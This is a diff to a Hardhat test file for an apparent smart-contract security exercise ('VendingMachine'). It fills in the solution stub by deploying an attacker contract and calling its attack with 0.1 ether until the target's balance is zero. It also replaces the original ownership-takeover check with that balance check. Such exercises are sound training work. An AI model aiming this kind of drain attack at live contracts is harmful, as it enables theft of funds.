@@ -7,6 +7,7 @@ describe('VendingMachine', () => {
   let target: Contract;
   let attacker: SignerWithAddress;
   let deployer: SignerWithAddress;
+
   before(async () => {
     [attacker, deployer] = await ethers.getSigners();
 
@@ -22,10 +23,14 @@ describe('VendingMachine', () => {
   });
 
   it('attack', async () => {
-    /**
-     * YOUR CODE HERE
-     */
+    const attackerContract = await (
+      await ethers.getContractFactory('VendingMachineAttacker', attacker)
+    ).deploy(target.address);
 
-    expect(await target.owner()).to.equal(attacker.address);
+    await attackerContract.deployed();
+
+    await (await attackerContract.attack({ value: ethers.utils.parseEther('0.1') })).wait();
+
+    expect(await ethers.provider.getBalance(target.address)).to.equal(0);
   });
 });
